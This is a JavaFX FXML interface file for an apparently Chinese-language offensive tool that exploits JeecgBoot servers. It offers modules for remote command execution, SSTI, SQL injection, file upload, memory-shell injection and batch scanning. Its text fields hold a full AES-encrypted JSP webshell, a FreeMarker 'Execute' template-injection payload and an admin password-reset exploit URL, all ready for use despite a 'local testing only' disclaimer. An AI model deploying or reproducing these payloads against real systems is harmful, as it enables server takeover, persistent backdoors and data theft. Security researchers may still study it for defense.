<?xml version="1.0" encoding="UTF-8"?>

<?import java.lang.String?>
<?import javafx.collections.FXCollections?>
<?import javafx.scene.control.Button?>
<?import javafx.scene.control.ComboBox?>
<?import javafx.scene.control.Label?>
<?import javafx.scene.control.Menu?>
<?import javafx.scene.control.MenuBar?>
<?import javafx.scene.control.MenuItem?>
<?import javafx.scene.control.Tab?>
<?import javafx.scene.control.TabPane?>
<?import javafx.scene.control.TextArea?>
<?import javafx.scene.control.TextField?>
<?import javafx.scene.layout.AnchorPane?>
<?import javafx.scene.web.HTMLEditor?>

<AnchorPane prefHeight="898.0" prefWidth="1401.0" xmlns="http://javafx.com/javafx/18" xmlns:fx="http://javafx.com/fxml/1" fx:controller="com.security.scanner.controller.MainController">
    <children>


        <ComboBox fx:id="comboBox" layoutX="526.0" layoutY="47.0" prefHeight="30.0" prefWidth="304.0" promptText="选择模块" visibleRowCount="20">
            <items>
                <FXCollections fx:factory="observableArrayList">

                    <String fx:value="all" />
                    <String fx:value="jeecg-boot queryFieldBySql远程命令执行漏洞" />
                    <String fx:value="jeecg-boot testConnection远程命令执行漏洞" />
                    <String fx:value="JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" />
                    <String fx:value="jeecg-boot-queryTableData-sqli注入漏洞" />
                    <String fx:value="jeecg-boot-getDictItemsByTable-sqli注入漏洞" />
                    <String fx:value="Jeecg-Boot qurestSql-SQL注入漏洞" />
                    <String fx:value="jeecg-boot commonController 任意文件上传漏洞" />
                    <String fx:value="jeecg-boot jmreport任意文件上传漏洞" />
                    <String fx:value="jeecg-boot-querySysUser信息泄露漏洞" />
                    <String fx:value="jeecg-boot-checkOnlyUser信息泄露漏洞" />
                    <String fx:value="jeecg-boot-httptrace信息泄露漏洞" />
                    <String fx:value="jeecg-boot-任意文件下载漏洞" />
                    <String fx:value="jeecg-boot-jeecgFormDemoController漏洞" />
                    <String fx:value="jeecg-boot-v2 api接口信息泄露" />
                    <String fx:value="jeecg-boot-v2 P3 Biz Chat任意文件读取漏洞" />
                    <String fx:value="jeecg-boot-v2 sys/duplicate/check注入漏洞" />
                    <String fx:value="jeecg-boot-v2 AviatorScript表达式注入漏洞" />
                    <String fx:value="jeecg-boot getTotalData注入漏洞" />
                    <String fx:value="jeecg-boot jmreport/show SQL注入漏洞" />
                </FXCollections>
            </items>
        </ComboBox>



        <Label layoutX="20.0" layoutY="52.0" text="目标:" />
        <TextField fx:id="test1" layoutX="65.0" layoutY="47.0" prefHeight="30.0" prefWidth="360.0" />
        <Label layoutX="440.0" layoutY="52.0" text="默认模块:" />
        <Button layoutX="856.0" layoutY="47.0" mnemonicParsing="false" onAction="#rce" prefHeight="30.0" prefWidth="154.0" text="检测" />
        <Button layoutX="1037.0" layoutY="47.0" mnemonicParsing="false" onAction="#rce1" prefHeight="30.0" prefWidth="131.0" text="清空面板" />
        <TabPane layoutX="9.0" layoutY="107.0" prefHeight="849.0" prefWidth="1166.0" tabClosingPolicy="UNAVAILABLE">
            <tabs>
                <Tab text="检测日志">
                    <content>
                        <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="787.0" prefWidth="1164.0">
                            <children>
                                <TextArea fx:id="test2" layoutX="2.0" layoutY="13.0" prefHeight="729.0" prefWidth="1155.0" text="&#10;&#10;该程序仅用于安全人员本地测试&#10;用户滥用造成的一切后果和作者无关&#10;请遵守法律法规！&#10;&#10;&#10;此漏洞危险，请手动测试&#10;JeecgBoot系统接口passwordChange任意用户密码重置漏洞&#10;&#10;/jeecg-boot/sys/user/passwordChange?username=admin&amp;password=admin&amp;smscode=&amp;phone=" />
                            </children></AnchorPane>
                    </content>
                </Tab>
                <Tab text="Cmdshell">
                    <content>
                        <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                            <children>
                                <Label layoutX="461.0" layoutY="41.0" text="cmd：" />
                                <Button layoutX="943.0" layoutY="36.0" mnemonicParsing="false" onAction="#rce5" prefHeight="30.0" prefWidth="154.0" text="执行" />
                                <TextField fx:id="cmd1" layoutX="517.0" layoutY="36.0" prefHeight="30.0" prefWidth="400.0" />
                                <Label layoutX="38.0" layoutY="41.0" text="模块:" />

                                <ComboBox fx:id="comboBox3" layoutX="83.0" layoutY="36.0" prefHeight="30.0" prefWidth="360.0" promptText="all">
                                    <items>
                                        <FXCollections fx:factory="observableArrayList">
                                            <String fx:value="jeecg-boot queryFieldBySql远程命令执行漏洞poc1" />
                                            <String fx:value="jeecg-boot queryFieldBySql远程命令执行漏洞poc2" />
                                            <String fx:value="jeecg-boot testConnection远程命令执行漏洞poc1" />
                                            <String fx:value="jeecg-boot testConnection远程命令执行漏洞poc2" />
                                            <String fx:value="JeecgBoot jmreport/loadTableData SSTI模板注入漏洞poc1" />
                                            <String fx:value="JeecgBoot jmreport/loadTableData SSTI模板注入漏洞poc2" />
                                        </FXCollections>
                                    </items>
                                </ComboBox>

                                <TextArea fx:id="testss" layoutX="6.0" layoutY="85.0" prefHeight="720.0" prefWidth="1166.0" wrapText="true" />
                            </children></AnchorPane>
                    </content>
                </Tab>
                <Tab text="文件上传">
                    <content>
                        <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                            <children>
                                <Button layoutX="843.0" layoutY="38.0" mnemonicParsing="false" onAction="#jeecggetshells" prefHeight="30.0" prefWidth="154.0" text="上传" />
                                <Label layoutX="26.0" layoutY="43.0" text="模块利用:" />
                                <Label layoutX="14.0" layoutY="529.0" text="传输日志:" />

                                <ComboBox fx:id="comboBoxshell" layoutX="101.0" layoutY="38.0" prefHeight="30.0" prefWidth="347.0" promptText="all">
                                    <items>
                                        <FXCollections fx:factory="observableArrayList">
                                            <String fx:value="jeecg-boot commonController 任意文件上传漏洞" />
                                            <String fx:value="jeecg-boot jmreport任意文件上传漏洞poc1" />
                                            <String fx:value="jeecg-boot jmreport任意文件上传漏洞poc2" />
                                        </FXCollections>
                                    </items>
                                </ComboBox>
                                <TextArea fx:id="testdfdf" layoutX="8.0" layoutY="84.0" prefHeight="423.0" prefWidth="1439.0" text="&lt;%! String xc=&quot;3c6e0b8a9c15224a&quot;; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); }catch (Exception e){return null; }}%&gt;&lt;%try{byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null){session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(&quot;parameters&quot;, data);Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}%&gt;" wrapText="true" />
                                <Label layoutX="483.0" layoutY="43.0" text="文件名:" />
                                <TextField fx:id="dsffsf" layoutX="562.0" layoutY="38.0" prefHeight="30.0" prefWidth="228.0" />
                                <TextArea fx:id="tedasfa" layoutX="9.0" layoutY="564.0" prefHeight="235.0" prefWidth="1437.0" wrapText="true" />
                            </children></AnchorPane>
                    </content>
                </Tab>
                <Tab text="批量检查">
                    <content>
                        <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                            <children>
                                <Label layoutX="23.0" layoutY="26.0" text="模块选择：" />
                                <TextArea fx:id="test3" layoutX="4.0" layoutY="75.0" prefHeight="725.0" prefWidth="1445.0" />

                                <ComboBox fx:id="comboBox1" layoutX="106.0" layoutY="21.0" prefHeight="30.0" prefWidth="499.0" promptText="all">
                                    <items>
                                        <FXCollections fx:factory="observableArrayList">
                                            <String fx:value="jeecg-boot queryFieldBySql远程命令执行漏洞" />
                                            <String fx:value="jeecg-boot testConnection远程命令执行漏洞" />
                                            <String fx:value="JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" />
                                            <String fx:value="jeecg-boot-queryTableData-sqli注入漏洞" />
                                            <String fx:value="jeecg-boot-getDictItemsByTable-sqli注入漏洞" />
                                            <String fx:value="Jeecg-Boot qurestSql-SQL注入漏洞" />
                                            <String fx:value="jeecg-boot jmreport任意文件上传漏洞" />
                                            <String fx:value="jeecg-boot getTotalData注入漏洞" />
                                            <String fx:value="jeecg-boot jmreport/show SQL注入漏洞" />

                                        </FXCollections>
                                    </items>
                                </ComboBox>
                                <Button layoutX="643.0" layoutY="21.0" mnemonicParsing="false" onAction="#rce2" prefHeight="30.0" prefWidth="148.0" text="开始检查" />
                                <Button layoutX="825.0" layoutY="21.0" mnemonicParsing="false" onAction="#jeecgxian" prefHeight="30.0" prefWidth="154.0" text="结束线程" />
                                <Button layoutX="1009.0" layoutY="21.0" mnemonicParsing="false" onAction="#jeecgss" prefHeight="30.0" prefWidth="131.0" text="开始线程" />
                            </children></AnchorPane>
                    </content>
                </Tab>
                <Tab text="内存马注入">
                    <content>
                        <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                            <children>
                                <TextArea layoutX="5.0" layoutY="10.0" prefHeight="756.0" prefWidth="1444.0" wrapText="true" />

                                <ComboBox fx:id="comboBoxlm" layoutX="142.0" layoutY="34.0" prefHeight="30.0" prefWidth="269.0" promptText="选择模块">
                                    <items>
                                        <FXCollections fx:factory="observableArrayList">
                                            <String fx:value="哥斯拉" />
                                            <String fx:value="冰蝎" />
                                        </FXCollections>
                                    </items>
                                </ComboBox>
                                <Label layoutX="41.0" layoutY="39.0" text="内存马模块:" />
                                <TextArea fx:id="testfdg" layoutX="12.0" layoutY="86.0" prefHeight="673.0" prefWidth="1432.0" />
                                <Button layoutX="447.0" layoutY="34.0" mnemonicParsing="false" onAction="#jeecgzhuru" prefHeight="30.0" prefWidth="124.0" text="注入" />
                            </children></AnchorPane>
                    </content>
                </Tab>
                <Tab text="代理配置">
                    <content>
                        <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                            <children>
                                <TextArea layoutX="5.0" layoutY="10.0" prefHeight="756.0" prefWidth="1444.0" wrapText="true" />
                                <Label layoutX="37.0" layoutY="71.0" prefHeight="20.0" prefWidth="95.0" text="IP：" />
                                <Button layoutX="21.0" layoutY="278.0" mnemonicParsing="false" onAction="#dailipeuz" prefHeight="30.0" prefWidth="124.0" text="设置代理" />
                                <TextField fx:id="daili" layoutX="93.0" layoutY="66.0" prefHeight="30.0" prefWidth="203.0" />
                                <Label layoutX="35.0" layoutY="121.0" text="端口:" />
                                <TextField fx:id="dailid" layoutX="92.0" layoutY="116.0" prefHeight="30.0" prefWidth="202.0" />
                                <TextArea fx:id="dailisda" layoutX="11.0" layoutY="348.0" prefHeight="408.0" prefWidth="1434.0" />
                                <TextField fx:id="yonghu" layoutX="93.0" layoutY="164.0" prefHeight="30.0" prefWidth="201.0" />
                                <TextField fx:id="mima" layoutX="93.0" layoutY="221.0" prefHeight="30.0" prefWidth="203.0" />
                                <Label layoutX="35.0" layoutY="169.0" text="用户:" />
                                <Label layoutX="35.0" layoutY="226.0" text="密码:" />

                                <ComboBox fx:id="comboBoxdaili" layoutX="93.0" layoutY="24.0" prefHeight="30.0" prefWidth="204.0" promptText="选择代理">
                                    <items>
                                        <FXCollections fx:factory="observableArrayList">
                                            <String fx:value="http" />
                                            <String fx:value="socket" />


                                        </FXCollections>
                                    </items>
                                </ComboBox>
                                <Label layoutX="37.0" layoutY="29.0" text="模块：" />
                                <Button layoutX="164.0" layoutY="278.0" mnemonicParsing="false" onAction="#dailiusds" prefHeight="30.0" prefWidth="131.0" text="取消代理" />
                            </children>
                        </AnchorPane>
                    </content>
                </Tab>
                <Tab text="自定义header">
                    <content>
                        <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                            <children>
                                <TextArea layoutX="5.0" prefHeight="766.0" prefWidth="1166.0" wrapText="true" />
                                <Label layoutX="31.0" layoutY="34.0" text="header:" />
                                <TextField fx:id="zidingyi" layoutX="99.0" layoutY="29.0" prefHeight="30.0" prefWidth="533.0" text="Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13" />
                                <Button layoutX="661.0" layoutY="29.0" mnemonicParsing="false" onAction="#peizhi" prefHeight="30.0" prefWidth="143.0" text="配置" />
                                <TextArea fx:id="zidingyishuchu" layoutX="9.0" layoutY="83.0" prefHeight="679.0" prefWidth="1155.0" />
                            </children>
                        </AnchorPane>
                    </content>
                </Tab>
                <Tab text="漏洞说明">
                    <content>
                        <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                            <children>
                                <TextArea layoutX="5.0" layoutY="8.0" prefHeight="758.0" prefWidth="1166.0" text="二开版本&#10;新增了两个 poc&#10;增加日志功能" wrapText="true" />
                            </children>
                        </AnchorPane>
                    </content>
                </Tab>
            <Tab text="记事本">
               <content>
                  <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                     <children>
                        <TextArea layoutX="5.0" layoutY="8.0" prefHeight="758.0" prefWidth="1166.0" wrapText="true" />
                        <HTMLEditor htmlText="&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body contenteditable=&quot;true&quot;&gt;&lt;/body&gt;&lt;/html&gt;" layoutX="5.0" layoutY="8.0" prefHeight="729.0" prefWidth="1155.0" />
                     </children>
                  </AnchorPane>
               </content>
            </Tab>
            </tabs>
        </TabPane>
        <TextField fx:id="urldf" layoutX="1461.0" layoutY="478.0" prefHeight="30.0" prefWidth="11.0" text="{&quot;dbSource&quot;:&quot;&quot;,&quot;sql&quot;:&quot;select '&lt;#assign value=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt;${value(\&quot;echo 888888\&quot;)}'&quot;,&quot;tableName&quot;:&quot;test_demo);&quot;,&quot;pageNo&quot;:1,&quot;pageSize&quot;:10}" />
        <MenuBar layoutX="3.0" prefHeight="32.0" prefWidth="1469.0">
            <menus>
                <Menu mnemonicParsing="false" text="设置">
                    <items>
                        <MenuItem mnemonicParsing="false" onAction="#banben" text="版本" />
                    </items>
                </Menu>
                <Menu mnemonicParsing="false" text="关于">
                    <items>
                        <MenuItem mnemonicParsing="false" onAction="#guanyu" text="关于软件" />
                    </items>
                </Menu>
            </menus>
        </MenuBar>
    </children>
</AnchorPane>
